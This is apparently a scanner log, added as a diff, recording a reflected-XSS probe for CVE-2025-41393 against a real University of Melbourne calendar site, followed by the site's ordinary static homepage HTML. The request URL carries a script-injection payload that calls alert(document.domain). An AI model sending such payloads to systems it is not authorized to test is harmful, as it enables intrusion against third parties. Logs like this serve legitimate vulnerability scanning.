@@ -1,0 +1,153 @@
+[CVE-2025-41393] Dumped HTTP request for https://www.umpc.esrc.unimelb.edu.au/?profile=</script><script>alert(document.domain)</script>
+
+
+GET /?profile=</script><script>alert(document.domain)</script> HTTP/1.1
+Host: www.umpc.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2025-41393] Dumped HTTP response https://www.umpc.esrc.unimelb.edu.au/?profile=</script><script>alert(document.domain)</script>
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 7780
+Content-Type: text/html
+Date: Wed, 06 Aug 2025 15:19:06 GMT
+Etag: "0b26d1efdc32c84ff9d28a83cfe6428b"
+Last-Modified: Wed, 26 Aug 2020 23:24:42 GMT
+Server: AmazonS3
+Via: 1.1 cfbbd45bc29ebb0e8475ffa26dff7618.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: u20-tWHPiqlNP3-C6Qk4xWeI4rp3AmHRDT0LQfX72pAhDRt68T2Rhg==
+X-Amz-Cf-Pop: IAD61-P3
+X-Amz-Version-Id: DB13.QEiU_ubQVLuDKKJZrhYhqvT4PUl
+X-Cache: Miss from cloudfront
+
+﻿<!DOCTYPE html>
+<html>
+<head>
+	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700' rel='stylesheet' type='text/css'>
+	<meta charset="utf-8">
+	<title>Home - The University of Melbourne Perpetual Calendar</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="Description" lang="en" content="Description">
+	<meta name="robots" content="index, follow">
+	<meta name="robots" content="noodp, noydir">
+	<meta name="format-detection" content="telephone=no" />
+	<link rel="schema.DC" href="http://purl.org/DC/elements/1.0/" />
+<meta name="DC.Title" lang="en" content="Home - The University of Melbourne Perpetual Calendar" />
+<meta name="DC.Creator" lang="en" content="The University of Melbourne eScholarship Research Centre" />
+<meta name="DC.Subject" lang="en" content="Home - The University of Melbourne Perpetual Calendar, SUBJECT TERMS" />
+<meta name="DC.Description" lang="en" content="Home - The University of Melbourne Perpetual Calendar - The University of Melbourne Perpetual Calendar is a biographical, bibliographical and archival resource about history of the University of Melbourne, and its impact on and contribution to public life." />
+<meta name="DC.Publisher" lang="en" content="The University of Melbourne eScholarship Research Centre" />
+<meta name="DC.Date.Created" scheme="ISO8601" lang="en" content="2018-08-14" />
+<meta name="DC.Date.LastModified" scheme="ISO8601" lang="en" content="2019-12-20" />
+<meta name="DC.Type" lang="en" content="Document" />
+<meta name="DC.Format" scheme="IMT" lang="en" content="text/html" />
+<meta name="DC.Identifier" scheme="URL" lang="en" content="https://umpc.esrc.unimelb.edu.au/index.html" />
+<meta name="DC.Language" scheme="ISO639" lang="en" content="en-gb" />
+<meta name="DC.Rights" lang="en" content="The University of Melbourne" />
+<meta name="Author" lang="en" content="The University of Melbourne eScholarship Research Centre" />
+<meta name="Description" lang="en" content="Home - The University of Melbourne Perpetual Calendar, The University of Melbourne Perpetual Calendar is a biographical, bibliographical and archival resource about history of the University of Melbourne, and its impact on and contribution to public life." />
+<meta name="Keywords" lang="en" content="Home - The University of Melbourne Perpetual Calendar, SUBJECT TERMS" />
+<meta name="Generator" content="Online Heritage Resource Manager (OHRM) V Alpha 2.16++++" />
+
+	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/apple-touch-icon-152x152-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144x144-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/apple-touch-icon-120x120-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/apple-touch-icon-114x114-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/apple-touch-icon-76x76-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/apple-touch-icon-72x72-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/apple-touch-icon-57x57-precomposed.png">
+	<link rel="apple-touch-icon-precomposed" href="/apple-touch-icon-precomposed.png">
+	<link rel="shortcut icon" href="/favicon.ico">
+	<!-- CSS links -->
+	<link rel="stylesheet" href="assets/css/normalize.css">
+	<link rel="stylesheet" href="assets/css/base.css">
+	<link rel="stylesheet" href="assets/css/layout.css">
+	<link rel="stylesheet" href="assets/css/modules.css">
+	<link rel="stylesheet" href="assets/css/modules-nav.css">
+	<!-- Header Javascript links -->
+	<script src="assets/js/responsive-nav.js"></script> 
+	<!--[if lt IE 9]>
+		<script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+		<script src="assets/js/respond.min.js"></script>
+	<![endif]-->
+</head>
+<body>
+<div class="skipLink">
+	<a href="#main">Skip to content (Press enter)</a>
+</div>
+<div class="row row-header">
+	<header class="container header" role="banner">
+		<h1 class="m-n">
+			<img src="assets/img/header.jpg" alt="The University of Melbourne Perpetual Calendar">
+		</h1>					
+	</header>
+</div>
+<div class="row row-nav">
+	<nav id="nav" class="container" role="navigation">
+		<ul>
+			<li id="nav-home" class="current"><a href="index.html">Home</a></li>
+			<li id="nav-about"><a href="about.html">About</a></li>
+			<li id="nav-browse"><a href="browse.htm">Browse</a></li>
+			
+		</ul>
+	</nav>
+</div>
+<div class="row row-content">
+	<div class="container">
+		<main class="wide" id="main" role="main">
+		<h1 class="intro1 m-n">
+							
+			</h1>
+			<p>The University of Melbourne Perpetual Calendar is a resource to discover the history of the University and its contribution to public value.</p>
+<p>In the past, the University Calendars were published annually from 1858 until 2009. They provided general and historical information about the University. The contents of the Calendars varied over the years, but they generally included a list of members, the statutes, regulations and resolutions under which the University operates and the formal records of each faculty’s constitution.</p>
+
+<p>A good place to start exploring is at the <a href="/biogs/E000001b.htm" target="_blank">University of Melbourne entry</a> which represents the University as it is today (in 2018). Otherwise you could try a general Search:</p>
+
+<script async src="https://cse.google.com/cse.js?cx=5ae875f8586c47d82"></script>
+<div class="gcse-search"></div>
+<P> CONTENT WARNING:   Depending of the search term used, you may or may not get ads at the top of the search results!</P>
+
+
+<p>See also: <a href="/exhib/dpv/index.html" target="_blank">Demonstrating Public Value: The Future Generations Scholarships</a>.
+
+<p><img src="assets/img/Capture.jpg"></p>
+<p style="font-size:12px"><i>Photo Credit:</i></br>‘The Old Quadrangle at The University of Melbourne’. Sourced from an article by Gary Foley (2012): 'The Contrarian: Eugenics, Melbourne University and me', 19 March, <i>Tracker</i> via 'Around Campus' by the University of Melbourne on <i>Pinterest</i>, URL: <a href="https://www.pinterest.com.au/unimelb/around-campus/" target="_blank">https://www.pinterest.com.au/unimelb/around-campus</a> . See archived version of the Gary Foley article in the Internet Archive WayBack Machine, URL: <a href="https://web.archive.org/web/20131119141258/http://tracker.org.au:80/2012/03/the-contrarian-eugenics-melbourne-university-and-me/" target="_blank">https://web.archive.org/web/20131119141258/http://tracker.org.au:80/2012/03/the-contrarian-eugenics-melbourne-university-and-me/</a> (accessed 16 August 2018). </p>
+		</main>
+		</div>
+</div>
+
+<div class="row row-credits">
+	<div class="container">
+		<div class="col2 font-1">
+			<p>Licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.
+				<a href="attribute.html">What do we mean by this?</a></p>
+				<p>Published by the University of Melbourne <a href="http://esrc.unimelb.edu.au" target="_blank"> eScholarship Research Centre</a></p>
+				<p>Page URL: https://umpc.esrc.unimelb.edu.au/index.html</p>
+		</div>
+		<div class="col2 col-last font-1">
+				<p></p>
+</div>
+	</div>
+</div>
+<div class="row row-footer">
+	<footer class="container" role="contentinfo">
+		<ul class="list-inline">
+			<li><a href="index.html">Home</a></li>
+			<li><a href="attribute.html">Attribution</a></li>
+			<li><a href="contact.html">Contact Us</a></li>
+		</ul>
+	</footer>
+</div>
+<!-- Footer Javascript links -->
+<script>
+  var navigation = responsiveNav("#nav");
+</script>
+</body>
+</html>
+
